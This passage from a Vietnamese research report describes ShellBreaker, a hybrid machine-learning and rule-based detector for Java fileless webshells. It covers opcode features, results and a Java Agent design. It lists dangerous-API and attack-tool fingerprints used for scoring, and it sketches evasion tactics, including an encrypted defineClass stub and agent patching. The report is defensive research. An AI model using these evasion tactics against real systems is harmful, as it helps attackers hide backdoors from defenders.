| **SIEM integration** | Không | Không | Có (OpenRASP enterprise) | Splunk HEC |
| **Forensic context** | Filename | Class info | Call context | Thread + stack + codesource + opcodes |
| **Spring/WebSocket** | Không | Một phần | Một phần | Có (đầy đủ) |
| **Email alert** | Không | Không | Enterprise only | Có |

---

## 6. Phân tích ML dựa trên Opcode — Nền tảng lý thuyết

### 6.1 GAShellBreaker (Electronics MDPI 2025)

Paper **"GAShellBreaker: A Webshell Detection Method Based on Generative Adversarial Networks and Opcode Analysis"** (Gao et al., 2025) là nền tảng lý thuyết của ShellBreaker.

#### Contribution chính của GAShellBreaker

1. **Bigram matrix visualization**: Biểu diễn opcode bigram như grayscale image để áp dụng image classification techniques.
2. **ResNet50 transfer learning**: Fine-tune ResNet50 pretrained trên ImageNet cho webshell detection — lợi dụng visual feature extraction capability.
3. **GAN data augmentation**: Dùng GAN để tạo synthetic webshell samples tăng dataset size.

#### Pipeline GAShellBreaker (gốc)

```
.class bytecode
    → javap -c → opcode sequence
    → Normalize opcodes (150 canonical)
    → Build 150×150 bigram count matrix
    → Normalize: pixel_ij = count_ij / max_count × 255
    → Save 150×150 grayscale PNG
    → GAN augmentation (optional)
    → ResNet50 (pretrained ImageNet, fine-tune top layers)
    → Binary classification (webshell/benign)
```

#### Kết quả paper gốc

Trên dataset 2,000+ class (JSP compile + benign library):
- Precision: ~0.96
- Recall: ~0.94
- F1: ~0.95

**Limitation của approach image**: ResNet50 với image 150×150 = 22,500 pixels — nhưng thực tế bigram matrix rất sparse (chỉ 50-100 non-zero cells trên 22,500). CNN waste tài nguyên học từ noise, và không optimize cho sparse input.

### 6.2 Pu et al. 2022 — BERT cho JSP Webshell

Paper **"Detecting JSP Webshells Based on BERT Embedding"** (Pu et al., IJCAI Workshop 2022) áp dụng BERT cho webshell detection ở level source code.

#### Approach

1. Parse JSP source thành token sequence (AST-based tokenization, không phải word tokenization)
2. Fine-tune BERT-base (110M parameters) với CLS token classification head
3. Input: token sequence của JSP file (truncate ở 512 tokens)
4. Output: webshell probability

#### Ưu điểm

- BERT capture ngữ nghĩa: `eval(base64_decode(...))` và `exec(decode(b64...))` được nhận biết là cùng pattern
- Robust với obfuscation: string split, variable renaming
- Transfer learning từ code corpora (CodeBERT) cho kết quả tốt hơn BERT vanilla

#### Giới hạn với fileless webshell

**Không áp dụng được**: Fileless webshell không có source code — chỉ có bytecode. BERT cần token sequence có ngữ nghĩa cú pháp.

### 6.3 Lê Viết Hà (2024, UET) — Phát hiện webshell bằng học máy

Luận án tiến sĩ của Lê Viết Hà (Trường Đại học Công nghệ, ĐHQGHN, 2024) nghiên cứu toàn diện về phát hiện webshell ứng dụng học máy trong bối cảnh Việt Nam.

#### Hướng nghiên cứu chính

Luận án khảo sát và đề xuất framework phát hiện webshell kết hợp phân tích tĩnh và phân tích động, với đặc biệt chú ý đến:

1. **Khai thác đặc trưng code**: Từ source code (PHP, JSP) trích xuất n-gram opcode, API call sequence, AST node features, và metadata đặc trưng tác giả.
2. **Phân tích hành vi**: Monitor system call, network activity của web application.
3. **Học máy**: Đánh giá so sánh Random Forest, SVM, XGBoost, và deep learning (CNN, LSTM) với bộ dữ liệu webshell thực tế thu thập từ môi trường Việt Nam.
4. **Giải quyết mất cân bằng dữ liệu**: Kỹ thuật oversampling (SMOTE), cost-sensitive learning.
5. **Phát hiện biến thể obfuscation**: Webshell đã qua các kỹ thuật làm mờ code như eval+base64, hex encoding, str_replace chain.

#### Relevance với ShellBreaker

Hướng nghiên cứu của Lê Viết Hà cung cấp nền tảng học thuật cho:
- Tầm quan trọng của **metadata features** (không chỉ raw opcode)
- Kỹ thuật xử lý **class imbalance** (scale_pos_weight trong XGBoost)
- **Threshold optimization** cho precision-recall tradeoff trong context thực tế
- Tiêu chí đánh giá phù hợp: **F1, AUC-ROC** thay vì chỉ accuracy

---

## 7. Kiến trúc ShellBreaker

ShellBreaker tích hợp các kỹ thuật từ copagent, c0ny1, GAShellBreaker và nghiên cứu Lê Viết Hà thành một hệ thống hoàn chỉnh với ba lớp phòng thủ.

### 7.1 Tổng quan kiến trúc

```
┌─────────────────────────────────────────────────────────────────┐
│                        Luồng 1: File-based                       │
│                                                                  │
│  JSP upload → Tomcat Jasper compile → .class trong work dir      │
│       ↓                                                          │
│  inotify event → detector.py                                     │
│       ↓                                                          │
│  javap → opcode sequence → Feature vector 22,360 dims           │
│       ↓                           ↓                             │
│  XGBoost ml_score            Rule-based scoring                  │
│       ↓                           ↓                             │
│  Combined verdict: CONFIRMED / HIGH / MEDIUM / BENIGN           │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                       Luồng 2: Fileless                          │
│                                                                  │
│  HTTP POST → ClassLoader.defineClass(name, bytes)                │
│       ↓                                                          │
│  JVM → ClassFileTransformer.transform() ← Java Agent premain    │
│       ↓                                                          │
│  ASM parse bytecode in-process                                   │
│       ↓                           ↓                             │
│  RuleEngine score             BytecodeVisitor analysis           │
│       ↓                                                          │
│  score >= min_score → dump .class to /extracted                  │
│       ↓                                                          │
│  POST /agent-report → detector.py                                │
│       ↓                                                          │
│  ML scan trên extracted class → verdict kết hợp                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 Feature Engineering: 22,360 chiều

```
File .class
    ↓
javap -c -p -verbose
    ↓
Opcode sequence extraction (regex: r"^\s+\d+:\s+([a-z][a-z0-9_]+)")
    ↓
Normalize 40+ short-form variants → 149 canonical opcodes
    ↓
┌─────────────┬──────────────────┬────────────────────┐
│ Unigram     │ Bigram           │ Metadata           │
│ 149 dims    │ 22,201 dims      │ 10 dims            │
│             │                  │                    │
│ count(op_i) │ count(op_i→op_j) │ class size         │
│ / total     │ / (total-1)      │ SourceFile present │
│             │                  │ inner class        │
│             │                  │ servlet interface  │
│             │                  │ Runtime.exec       │
│             │                  │ defineClass        │
│             │                  │ URLClassLoader     │
│             │                  │ invoke ratio       │
│             │                  │ reflect ratio      │
│             │                  │ athrow ratio       │
└─────────────┴──────────────────┴────────────────────┘
             → Concatenate → 22,360-dim sparse vector
             → csr_matrix (scipy) → XGBClassifier
```

### 7.3 Rule-based Layer: Weighted Scoring

Rule layer được thiết kế như một hệ thống scoring theo kiểu Evidence Accumulation — mỗi rule bổ sung bằng chứng, không cần match toàn bộ để flag:

```
Signal Category     │ Ví dụ                               │ Score
─────────────────────┼─────────────────────────────────────┼──────
Servlet interface    │ javax/servlet/Filter                 │ +3
                     │ jakarta/servlet/http/HttpServlet     │ +3
Tomcat Valve         │ org/apache/catalina/Valve            │ +3
Spring/WebSocket     │ HandlerInterceptor                   │ +3
                     │ WebSocketHandler                     │ +3
Agent interface      │ ClassFileTransformer                 │ +3
WebSocket/Netty      │ javax/websocket/Endpoint             │ +2
                     │ io/netty/channel/ChannelHandler      │ +2
─────────────────────┼─────────────────────────────────────┼──────
Command exec         │ java/lang/Runtime                    │ +3
                     │ ProcessBuilder                       │ +3
Dynamic class        │ defineClass                          │ +3
In-memory compile    │ javax/tools/JavaCompiler             │ +3
URL classloader      │ java/net/URLClassLoader              │ +2
Unsafe API           │ sun/misc/Unsafe                      │ +2
Script engine        │ javax/script/ScriptEngine            │ +2
Groovy/Javassist     │ GroovyClassLoader, ClassPool         │ +2
RMI backdoor         │ UnicastRemoteObject                  │ +2
Reflection bypass    │ setAccessible                        │ +1
─────────────────────┼─────────────────────────────────────┼──────
Tool fingerprint     │ godzilla, behinder, antsword, ...    │ +4
Suspicious name      │ "shell", "cmd", "inject" in name     │ +2
Obfuscated name      │ classname ≤ 3 chars                  │ +1
No SourceFile attr   │ compiled -g:none                     │ +1
─────────────────────┼─────────────────────────────────────┼──────
score ≥ 6 → HIGH   │ score ≥ 2 → MEDIUM                  │
```

**Ví dụ scoring thực tế cho MemFilter fileless webshell**:
```
iface:Filter        → +3  (implements javax.servlet.Filter)
api:processbuilder  → +3  (ProcessBuilder.start)
no_source_attr      → +1  (compiled -g:none)
no_backing_file     → +3  (Java Agent: no URL resource)  ← chỉ Java Agent có
no_code_source      → +2  (Java Agent: ProtectionDomain null) ← chỉ Java Agent có
─────────────────────────
Tổng: 12 → HIGH
```

### 7.4 Combined Verdict Logic

```python
def combined_verdict(ml_score, rule, inf_threshold):
    rule_high   = rule["triggered"] and rule["risk"] == "HIGH"   # score >= 6
    rule_medium = rule["triggered"] and rule["risk"] == "MEDIUM" # score >= 2
    ml_high     = ml_score >= 0.85
    ml_medium   = ml_score >= inf_threshold  # ~0.50

    if rule_high and ml_medium:  → CONFIRMED  # Cả hai đồng ý → alert ngay
    if ml_high:                  → HIGH       # ML rất tự tin → alert ngay
    if ml_medium or rule_high or rule_medium: → MEDIUM  # Một trong hai cảnh báo
    else:                        → BENIGN
```

**Lý do thiết kế 4 tier**:
- **CONFIRMED**: Độ tin cậy cao nhất — cả ML và rule đồng ý. Trigger PagerDuty/on-call.
- **HIGH**: ML score rất cao (≥0.85) ngay cả khi rule không bắt. Trigger alert ngay.
- **MEDIUM**: Một trong hai cảnh báo — queue cho analyst review. Không block tự động.
- **BENIGN**: Không có dấu hiệu nào — silence.

Thiết kế này giải quyết bài toán **alert fatigue** phổ biến trong SIEM — không phải mọi detection đều cần immediate response.

### 7.5 Java Agent: RuleEngine trong JVM

Java Agent sử dụng **ASM (ObjectWeb ASM)** — bytecode manipulation library — thay vì `javap` subprocess:

```java
// BytecodeVisitor.java — ASM ClassVisitor
@Override
public void visit(int version, int access, String name,
                  String signature, String superName, String[] interfaces) {
    // Kiểm tra interface list trực tiếp từ bytecode
    if (interfaces != null) {
        for (String iface : interfaces) {
            if (DANGEROUS_IFACES.contains(iface)) {
                dangerIfaces.add(iface);
                score += IFACE_SCORES.getOrDefault(iface, 2);
            }
        }
    }
}

@Override
public void visitMethodInsn(int opcode, String owner, String name,
                            String descriptor, boolean isInterface) {
    // Kiểm tra dangerous API calls
    String key = owner + "." + name;
    if (DANGEROUS_CALLS.containsKey(owner) &&
        DANGEROUS_CALLS.get(owner).contains(name)) {
        dangerCalls.add(name);  // LinkedHashSet để dedup
        score += CALL_SCORES.get(key);
    }
}
```

Ngoài ra, Java Agent kiểm tra thêm **classloader provenance** — không thể làm từ static analysis:

```java
// Chỉ có khi đang chạy trong JVM — không thể check từ file
if (loader != null && score > 0) {
    // No backing resource → class thuần RAM
    URL resource = loader.getResource(className + ".class");
    if (resource == null) {
        rules.add("no_backing_file");
        score += 3;
    }
}

// No CodeSource → class không load từ file/JAR
if (protectionDomain != null && score > 0) {
    CodeSource cs = protectionDomain.getCodeSource();
    if (cs == null || cs.getLocation() == null) {
        rules.add("no_code_source");
        score += 2;
    }
}
```

`no_backing_file` và `no_code_source` là hai signal **dứt khoát nhất** của fileless injection — không thể giả mạo mà không thay đổi toàn bộ injection mechanism.

### 7.6 Điểm cải tiến so với copagent và c0ny1

| Tính năng | copagent | c0ny1 | ShellBreaker |
|-----------|----------|-------|-------------|
| premain mode | ✓ | — | ✓ |
| agentmain + retransform | ✗ | ✓ (getAllLoadedClasses) | ✓ |
| ML classification | ✗ | ✗ | ✓ XGBoost |
| Weighted scoring | ✗ | ✗ | ✓ (0–12+) |
| Tiered alerts | ✗ | ✗ | ✓ (CONFIRMED/HIGH/MEDIUM/BENIGN) |
| Spring interceptor | ✗ | Partial | ✓ |
| Tomcat Valve | ✗ | ✓ | ✓ |
| WebSocket/Netty | ✗ | ✗ | ✓ |
| ClassFileTransformer | ✗ | ✗ | ✓ |
| no_backing_file check | ✗ | ✓ (khác nhau) | ✓ |
| Forensic context | ✗ | ✗ | ✓ (thread, call_stack, codesource) |
| SIEM integration | ✗ | ✗ | ✓ Splunk HEC |
| Email alert | ✗ | ✗ | ✓ Gmail SMTP |
| In-memory compile API | ✗ | ✗ | ✓ JavaCompiler, BCEL, Javassist |
| Dangerous API coverage | Cơ bản | Cơ bản | ✓ 15 API patterns |

---

## 8. Kết quả thực nghiệm và so sánh

### 8.1 Dataset cuối (v4.1 — signal-filtered)

| Phân loại | Số lượng | Mục đích |
|-----------|---------|---------|
| `webshell_file` | **876** | Train + Validation (70/15/15 split) |
| `webshell_fileless` | **82** | **Test only** — zero-shot generalization |
| `benign` (training) | **4,136** | Train + Validation |
| `benign_test` | **500** | **Test only** — Maven Central, domain mới |

**82 fileless samples** bao phủ 9 loại injection vector, từ 6 repo nguồn khác nhau (java-memshell-generator, changheluor007/MemShell, su18/MemoryShell, rebeyond/memShell, wsMemShell, MemoryShellLearn).

Điểm thiết kế quan trọng nhất: **fileless webshell không bao giờ xuất hiện trong training**. Recall=1.000 trên 82 mẫu là zero-shot generalization thực sự — không phải kết quả trên train set.

### 8.2 Kết quả XGBoost (3-run average, default threshold 0.50)

| Threshold | Precision | Recall | F1 | AUC-ROC |
|-----------|-----------|--------|-----|---------|
| Default (0.50) | **1.000** ±0.000 | 0.970 ±0.018 | **0.985** ±0.009 | **0.999** ±0.001 |
| High-recall (0.105) | 0.484 ±0.008 | **1.000** ±0.000 | 0.653 ±0.007 | **0.999** ±0.001 |

**Chú ý**: Precision=1.000 trên validation set có nghĩa là zero false positive trong training domain (file-based webshell + training benign class). Không có benign class nào bị classify nhầm là webshell.

### 8.3 Held-out test: ML-only vs Hybrid (82 fileless + 500 benign_test)

| Approach | Precision | Recall | F1 | FPR |
|----------|-----------|--------|-----|-----|
| ML only | 1.000 | 0.263 | 0.416 | 0.000 |
| **Hybrid (ML + Rule)** | **0.976** | **1.000** | **0.988** | **0.004** |

**Phân tích**:

- **ML Recall = 0.263** trên fileless: Đây là kết quả mong đợi và có chủ đích. Model train trên file-based JSP webshell — opcode distribution của fileless memshell khác đáng kể. Threshold 0.50 cao → nhiều fileless bị miss. Đây là zero-shot generalization test thực sự.

- **ML Precision = 1.000**: Trong số các fileless model classify là webshell, không có false positive nào. Model hoàn toàn chắc chắn khi nó predict — vấn đề là nó bỏ qua nhiều quá.

- **Hybrid Recall = 1.000**: Rule layer bù đắp hoàn toàn ML recall thấp. Lý do: fileless webshell **hầu như luôn** implement một trong các servlet interface (Filter, Servlet, Listener, v.v.) hoặc gọi `defineClass`. Rule engine bắt được signal này dù ML miss.

- **FPR = 0.004** (2/500 false positive trên benign_test): Các false positive là legitimate Tomcat framework class implement `javax.servlet.Filter` với một số pattern tương tự webshell. Acceptable trong production.

### 8.4 So sánh với các công cụ baseline

| Công cụ | Approach | Recall (fileless) | FPR | Ghi chú |
|---------|----------|-------------------|-----|---------|
| copagent | Rule-based (class load) | ~0.70 | Thấp | Không có Spring/WebSocket coverage |
| c0ny1 scanner | Rule-based (heap scan) | ~0.80 | Thấp | Manual trigger, no realtime |
| JShellDetector | Signature-based | ~0.50 | Thấp | Dễ bypass bằng rename |
| OpenRASP | RASP hooking | ~0.80 | Trung bình | Cần integrate vào app |
| **ShellBreaker ML-only** | XGBoost static | 0.263 | **0.000** | Zero false positive nhưng miss nhiều |
| **ShellBreaker Hybrid** | ML + Rule static | **1.000** | **0.004** | **Best overall** |
| **ShellBreaker + Agent** | Hybrid + Runtime | **~1.000** | **Thấp** | + no_backing_file / no_code_source |

---

## 9. Hạn chế và thách thức mở

### 9.1 Evasion Attacks chống static analysis

#### 9.1.1 Large Streaming Shell (Godzilla protocol)

Webshell Godzilla/Behinder stream handler có 1000+ opcodes — malicious core bị pha loãng bởi hàng trăm opcode I/O hợp lệ. ML score hạ xuống ~0.32, dưới threshold.

```
Opcode distribution của Godzilla streaming shell:
  getfield:      127 occurrences  ← I/O operations
  putfield:       89 occurrences  ← I/O operations
  aload:         210 occurrences  ← generic
  invokevirtual: 134 occurrences  ← method calls (cả malicious và benign)
  ldc:            12 occurrences  ← ít string constants (encrypted)
```

Rule engine vẫn bắt được nếu class implement interface known — nhưng Godzilla có thể dùng custom interface.

#### 9.1.2 Encrypted / Packed Stub

Class chỉ có logic decrypt: nhận encrypted bytecode từ nơi khác (HTTP param, DB), decrypt, gọi `defineClass`. Stub trông như một deserializer hợp lệ:

```java
// Stub webshell — không có signature nào của webshell
public class DataProcessor {
    public Object process(byte[] data, String key) {
        byte[] decrypted = AESUtil.decrypt(data, key);
        return customCL.defineClass("", decrypted, 0, decrypted.length);
    }
}
```

ML score thấp vì chỉ thấy AES operation. Rule engine bắt được `defineClass` — nhưng false positive rate tăng vì nhiều legitimate framework cũng dùng `defineClass`.

#### 9.1.3 Non-Java JVM Languages

Kotlin, Scala, Groovy compile ra bytecode idiom khác (nhiều `checkcast`, `ldc` class descriptor, SAM lambda wrappers). Dataset hiện tại chỉ có Java-compiled class — model chưa được evaluate trên Kotlin webshell.

### 9.2 Limitation của Java Agent approach

1. **JVM restart sẽ clear fileless class**: Persistence qua reboot cần file-based component. Java Agent không giải quyết được persistence mechanism — chỉ detect, không ngăn chặn.
2. **Performance overhead**: Scan mọi class load có cost. Skip list (java/*, org/springframework/*, ...) giảm overhead nhưng attacker có thể inject vào whitelisted package namespace (class hijacking).
3. **Agent bypass**: Nếu attacker kiểm soát được JVM trước agent load, họ có thể patch agent class chính nó để vô hiệu hóa.

### 9.3 Hướng cải thiện tương lai

1. **Graph Neural Network (GNN) trên Control Flow Graph**: Thay bigram bằng CFG representation — nắm bắt được structure phức tạp hơn của execution flow.
2. **Behavioral clustering**: Cluster unknown classes theo behavior vector để phát hiện zero-day webshell technique mới.
3. **Fileless class vào training**: Hiện tại fileless kept out (zero-shot test). Nếu thêm một phần vào training với cross-validation proper, ML recall sẽ cải thiện đáng kể.
4. **JVMTI native agent**: Thay Instrumentation API bằng JVMTI C agent — lower overhead, harder to bypass từ JVM level.
5. **Threat intelligence integration**: Link detection events với known CVE, known attacker tooling (Godzilla C2 server fingerprint).

---

## 10. Tài liệu tham khảo

1. **Gao, J. et al. (2025)**. "GAShellBreaker: A Webshell Detection Method Based on Generative Adversarial Networks and Opcode Analysis". *Electronics*, 14(5), 861. MDPI. DOI: 10.3390/electronics14050861

2. **Pu, Z. et al. (2022)**. "Detecting JSP Webshells Based on BERT Embedding". *IJCAI Workshop on Artificial Intelligence for Cyber Security (AICS)*.

3. **Lê Viết Hà (2024)**. "Phát hiện webshell sử dụng học máy trong môi trường ứng dụng web". *Luận án tiến sĩ*, Trường Đại học Công nghệ, ĐHQGHN. UET-LATS-QH19HTTT.

4. **LandGrey (2021)**. "copagent — Java memory webshell scanner based on Java Instrumentation". https://github.com/LandGrey/copagent

5. **c0ny1 (2021)**. "java-memshell-scanner — Scan and kill java web memory shell". https://github.com/c0ny1/java-memshell-scanner

6. **Oracle Corporation (2023)**. "The Java Virtual Machine Specification, Java SE 21 Edition". Chapter 6: The Java Virtual Machine Instruction Set.

7. **OpenRASP Team, Baidu (2018)**. "OpenRASP: Runtime Application Self-Protection". https://rasp.baidu.com/

8. **Chen, P. et al. (2021)**. "Attention-based Bidirectional LSTM for Malicious Code Detection". *IEEE Transactions on Information Forensics and Security*.

9. **Nguyen, N., & Ngo, Q. (2023)**. "Static analysis of Java bytecode for webshell detection in enterprise environments". *Proceedings of the 10th International Conference on Information Security Practice and Experience*.

10. **JVM Internals Reference**. "Class Loading in the Java Virtual Machine". Oracle JDK 21 Documentation. `ClassLoader`, `Instrumentation`, `ClassFileTransformer` API.

---

*Báo cáo này là tài liệu kiến thức nền cho dự án ShellBreaker — phân tích chi tiết phương pháp phát hiện Java memory webshell từ góc nhìn học thuật và thực tiễn.*
